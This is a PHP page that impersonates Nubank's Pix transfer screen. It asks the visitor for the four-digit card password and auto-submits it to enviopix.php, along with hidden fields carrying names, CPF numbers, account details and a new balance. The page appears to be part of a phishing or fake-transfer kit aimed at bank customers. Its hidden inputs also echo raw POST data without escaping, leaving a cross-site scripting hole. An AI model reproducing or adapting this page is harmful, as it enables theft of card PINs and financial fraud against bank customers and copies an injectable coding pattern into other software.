<?php
session_start();
include 'conexaoatualizada.php'; // Inclua o arquivo de conexão

if (!isset($_SESSION['id'])) {
    header("refresh:0;url=login.php");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Nubank</title>
<link rel="stylesheet" href="estilonu.css">
  <style type="text/css">
    body {
	text-align: center;
	margin: 0;
	padding: 0;
	background-color: #FFF;
    }
.texto1 {
	font-size: 16px;
	color: #666;
	font-family: Arial, Helvetica, sans-serif;
	font-weight: normal;
    line-height: 1;
}

    img {
      max-width: 100%;
      height: auto;
    }
.botaoentrar {
	background-color: #8A02DB;
	cursor: pointer;
	text-align: center;
	margin: 0px;
	padding: 0px;
	font-family: Tahoma, Geneva, sans-serif;
	width: 340px;
	font-size: 18px;
	background-position: center center;
	font-style: normal;
	height: 60px;
	border-radius: 50px;
	text-align: center;
	border: 1px none #FFF;
	color: #FFF;
}
  .fundoimagem tr td table tr td {
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	background-image: url(03.png);
}
  .txt {
	font-family: Georgia, "Times New Roman", Times, serif;
	font-size: 14px;
}
  .fundo {
	background-image: url(imagens/inicial.PNG);
	background-repeat: no-repeat;
	background-position: center top;
	background-size: 100%;
	
}
  .topo {
	background-color: #771AC9;
}
  .topotexto {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 20px;
	color: #FFF;
}
  .bases {
}
.image-container {
  overflow-x: auto;
  white-space: nowrap;
}

.image-container img {
  display: inline-block;
  margin-right: 10px; /* Adicione um espaÃ§amento entre as imagens */
}
  .fatura {
	font-size: 18px;
	color: #666;
}
.fatura2 {
	font-size: 18px;
	color: #333;
}
  .limite {
	font-size: 13px;
	font-family: Arial, Helvetica, sans-serif;
	color: #797979;
}
  .linha {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
#divFixa {
	position: fixed;
	bottom: 2px; /* Ajuste o valor do espaÃ§amento conforme necessÃ¡rio */
	width: 285px;
	left: 50%;
	transform: translateX(-50%);
	background-color: rgba(0, 0, 0, 0.0);
	opacity: 0.96;}

  .valortransf {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 36px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	color: #000;
	font-weight: bold;
}
  .linha1 {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
  .valorx {
	outline: none;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 20px;
	color: #000;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	font-weight: normal;
}
  .linha {
	background-image: url(imagens/linha.png);
	background-repeat: no-repeat;
	background-position: center bottom;
	width: 100%;
}
  .faturaw {
	color: #8E33CC;
	font-family: Arial, Helvetica, sans-serif;
	height: 55px;
	width: 55px;
}
  .caixasenha {
	font-family: "Graphik Medium";
	font-size: 28px;
	text-align: center;
	border: 1px solid #999;
	height: 43px;
	width: 37px;
}
  .informacao {	font-family: Arial, Helvetica, sans-serif;
	font-size: 15px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
  </style>
  <script>
    window.addEventListener('DOMContentLoaded', function() {
      document.getElementById('1').focus();
    });
  </script>
</head>
<body>
<table width="350" border="0" align="center">
  <tr>
    <td height="50" align="center"><table width="350" border="0">
      <tr>
        <td><a href="areapix.php"><img src="imagens/setay.png" alt="" width="31"></a></td>
        <td align="right">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="100%" border="0">
  <tr>
    
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td>
<form name="form1" method="post" action="enviopix.php">
<table width="350" border="0" align="center">
      <tr>
        <td height="30" align="left" valign="middle"><span style="font-size: 18px; color: #333; font-family: 'Graphik Regular';">Digite a </span><span class="icon2" style="font-size: 18px; color: #820AD1;"><b>senha de 4 dígitos do seu cartão </b></b></span></td>
      </tr>
      <tr>
        <td height="250" align="center" valign="bottom"><label for="1"></label>
         <?php echo $_SESSION['id'] ?> <script>
  function proximoCampo(event, proximoCampoId) {
    const campoAtual = event.target;
    if (campoAtual.value !== '') {
      const proximoCampo = document.getElementById(proximoCampoId);
      proximoCampo.focus();
      proximoCampo.value = '';
    }
  }

  function enviarFormulario(event) {
    const campoAtual = event.target;
    if (campoAtual.value !== '') {
      const formulario = campoAtual.closest('form');
      formulario.submit();
    }
  }
          </script>
          <input name="1" type="password" class="caixasenha" id="1" size="1" maxlength="1" onkeyup="proximoCampo(event, '2')" style="border-radius: 10px; outline: none;" inputmode="numeric" >
<input name="2" type="password" class="caixasenha" id="2" size="1" maxlength="1" onkeyup="proximoCampo(event, '3')" style="border-radius: 10px; outline: none;" inputmode="numeric" >
<input name="3" type="password" class="caixasenha" id="3" size="1" maxlength="1" onkeyup="proximoCampo(event, '4')" style="border-radius: 10px; outline: none;" inputmode="numeric" >
<input name="4" type="password" class="caixasenha" id="4" size="1" maxlength="1" onkeyup="enviarFormulario(event)" style="border-radius: 10px;  outline: none;" inputmode="numeric" ></tr>
      <tr>
        <td align="center" valign="middle"> 
<div  hidden="">
          <input name="chave" type="text" class="informacao" id="chave" value="<?php echo $_POST["chave"];?>">
          <br>
          <input name="data"type="text" class="informacao" id="data" value="<?php echo $_POST["data"]; ?>">
          <br>
          <input name="hora"type="text" class="informacao" id="hora" value="<?php echo $_POST["hora"]; ?>">
          <br>
<input name="valor"type="text" class="informacao" id="valor" value="<?php echo $_POST["valor"]; ?>">
        <br>
        <input name="dnome"type="text" class="informacao" id="dnome" value="<?php echo $_POST["dnome"]; ?>">
        <br>
        <input name="dcpf"type="text" class="informacao" id="dcpf" value="<?php echo $_POST["dcpf"]; ?>">
        <br>
        <input name="dinstitu"type="text" class="informacao" id="dinstitu" value="<?php echo $_POST["dinstitu"]; ?>">
        <br>
        <input name="dagencia"type="text" class="informacao" id="dagencia" value="<?php echo $_POST["dagencia"]; ?>">
        <br>
        <input name="dconta"type="text" class="informacao" id="valor6" value="<?php echo $_POST["dconta"]; ?>">
        <br>
        <input name="dtconta"type="text" class="informacao" id="valor6" value="<?php echo $_POST["dtconta"]; ?>">
        <br>
        <input name="onome"type="text" class="informacao" id="onome" value="<?php echo $_POST["onome"]; ?>">
        <br>
        <input name="oinstitu"type="text" class="informacao" id="oinstitu" value="<?php echo $_POST["oinstitu"]; ?>">
        <br>
        <input name="oagencia"type="text" class="informacao" id="oagencia" value="<?php echo $_POST["oagencia"]; ?>">
        <br>
        <input name="oconta"type="text" class="informacao" id="valor7" value="<?php echo $_POST["oconta"]; ?>">
        <br>
        <input name="ocpf"type="text" class="informacao" id="valor8" value="<?php echo $_POST["ocpf"]; ?>">
        <br>
            <input name="saldonovo"type="text" class="informacao" id="valor3" value="<?php echo $_POST["saldonovo"]; ?>">
            <br>
            <br>
     </div>
      </tr>
    </table>
    </form></td>
  </tr>
</table>
</body>
</html>
